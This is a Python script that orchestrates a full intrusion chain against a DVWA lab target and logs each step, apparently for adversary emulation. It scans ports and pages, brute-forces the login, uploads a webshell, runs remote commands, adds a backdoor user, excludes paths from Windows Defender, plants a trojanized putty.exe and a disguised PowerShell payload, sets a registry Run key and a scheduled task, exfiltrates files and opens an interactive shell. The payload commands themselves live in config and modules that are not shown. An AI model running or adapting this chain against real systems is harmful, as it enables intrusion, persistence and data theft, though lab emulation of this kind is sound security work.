from stages.recon import Recon
from stages.access import Access
from stages.execution import Execution
from stages.persistence import Persistence
from stages.exfiltration import Exfiltration
from services.AttackLogger import AttackLogger
from config import *
from time import sleep

with AttackLogger(output_dir="attack_logs") as log:

    recon = Recon(TARGET_IP)

    recon.scan_ports()
    log.log(
        "port_scan", "recon",
        action="tcp_port_scan",
        details={"target": TARGET_IP},
        success=True,
    )

    pages = recon.scan_pages("wordlists/web.txt")
    print(pages)
    log.log(
        "web_recon", "recon",
        action="directory_wordlist_scan",
        details={
            "target": TARGET_IP,
            "wordlist": "wordlists/web.txt",
            "pages_found": pages if isinstance(pages, list) else str(pages)[:200],
        },
        success=bool(pages),
    )
    sleep(3)

    access = Access(
        username_wordlist=USERNAME_WORDLIST,
        password_wordlist=PASSWORD_WORDLIST,
        url=DVWA_LOGIN_URL,
    )

    (username, password) = access.brute_force_login()
    creds_found = bool(username and password)
    log.log(
        "brute_force", "access",
        action="http_brute_force_login",
        details={
            "url":               DVWA_LOGIN_URL,
            "username_wordlist": USERNAME_WORDLIST,
            "password_wordlist": PASSWORD_WORDLIST,
            "found_username":    username if creds_found else None,
        },
        result=f"{username}:{password}" if creds_found else "no credentials found",
        success=creds_found,
    )

    if creds_found:
        print(f"Valid credentials found: {username}:{password}")
    else:
        print("No valid credentials found.")

    response = access.login(username, password, DVWA_LOGIN_URL)
    login_ok = response is not False
    log.log(
        "brute_force", "access",
        action="session_login",
        details={"url": DVWA_LOGIN_URL, "username": username},
        success=login_ok,
    )
    if not login_ok:
        print("Login failed with valid credentials.")

    sleep(3)

    access.file_upload(WEBSHELL_FILENAME, DVWA_FILE_UPLOAD_URL)
    log.log(
        "file_upload", "access",
        action="webshell_upload",
        details={
            "filename": WEBSHELL_FILENAME,
            "url":      DVWA_FILE_UPLOAD_URL,
        },
        success=True,
    )

    sleep(3)

    execution = Execution(session=access.session)

    res_whoami = execution.execute_command("whoami", DVWA_FILE_INCLUSION_URL)
    print(f"Result of 'whoami' command: {res_whoami}")
    log.log(
        "command_exec", "execution",
        action="remote_command_whoami",
        details={
            "command": "whoami",
            "url":     DVWA_FILE_INCLUSION_URL,
        },
        result=res_whoami,
        success=bool(res_whoami),
    )
    sleep(3)

    persistence = Persistence(session=access.session)

    response_create_user = persistence.create_user(
        NEW_USER, NEW_USER_PASSWORD, DVWA_FILE_INCLUSION_URL
    )
    print(response_create_user)
    log.log(
        "create_user", "persistence",
        action="net_user_add",
        details={
            "username": NEW_USER,
            "url":      DVWA_FILE_INCLUSION_URL,
        },
        result=response_create_user,
        success=bool(response_create_user),
    )
    sleep(3)

    exfiltration = Exfiltration(
        host=TARGET_IP,
        username=NEW_USER,
        password=NEW_USER_PASSWORD,
    )
    exfiltration.connect()
    log.log(
        "lateral_movement", "exfiltration",
        action="winrm_connect",
        details={"host": TARGET_IP, "username": NEW_USER},
        success=True,
    )

    # AV Exclusion
    res_excl = exfiltration.execute_command(EXCLUDE_COMMAND)
    print(f"Result of 'Add-MpPreference' command: {res_excl}")
    log.log(
        "av_exclusion", "exfiltration",
        action="defender_add_exclusion",
        details={"command": EXCLUDE_COMMAND},
        result=res_excl,
        success=True,
    )
    sleep(3)

    # Malware upload — putty_infected.exe
    res_upload = exfiltration.upload_file(
        "malware/putty_infected.exe",
        "C:/xampp/htdocs/hackable/uploads/putty.exe",
    )
    print(res_upload)
    log.log(
        "malware_upload", "exfiltration",
        action="upload_trojanized_binary",
        details={
            "source":      "malware/putty_infected.exe",
            "destination": "C:/xampp/htdocs/hackable/uploads/putty.exe",
        },
        result=res_upload,
        success=True,
    )

    # Malware upload — windowsupdate.ps1
    res_upload2 = exfiltration.upload_file(
        "malware/windowsupdate.ps1",
        "C:/xampp/htdocs/hackable/uploads/windowsupdate.ps1",
    )
    print(res_upload2)
    log.log(
        "malware_upload", "exfiltration",
        action="upload_ps1_payload",
        details={
            "source":      "malware/windowsupdate.ps1",
            "destination": "C:/xampp/htdocs/hackable/uploads/windowsupdate.ps1",
        },
        result=res_upload2,
        success=True,
    )

    sleep(3)
    # Registry persistence
    res_registry = exfiltration.execute_command(EXPLOIT_REGISTRY)
    print(f"Result of 'reg add' command: {res_registry}")
    log.log(
        "registry_persist", "persistence",
        action="reg_add_run_key",
        details={"command": EXPLOIT_REGISTRY},
        result=res_registry,
        success=True,
    )

    sleep(3)
    # Scheduled Task
    res_task = exfiltration.execute_command(SCHEDULE_TASK)
    print(res_task)
    log.log(
        "scheduled_task", "persistence",
        action="schtasks_create",
        details={"command": SCHEDULE_TASK},
        result=res_task,
        success=True,
    )
    sleep(3)

    # Data Exfiltration
    for path in EXILFTRATION_DATA:
        res = exfiltration.exfiltrate_data(path)
        print(res)
        log.log(
            "data_exfiltration", "exfiltration",
            action="exfiltrate_file",
            details={"path": path},
            result=res,
            success=bool(res),
        )
    sleep(3)

    log.log(
        "interactive_shell", "exfiltration",
        action="interactive_shell_start",
        details={"host": TARGET_IP, "user": NEW_USER},
        success=True,
    )
    exfiltration.interactive_shell()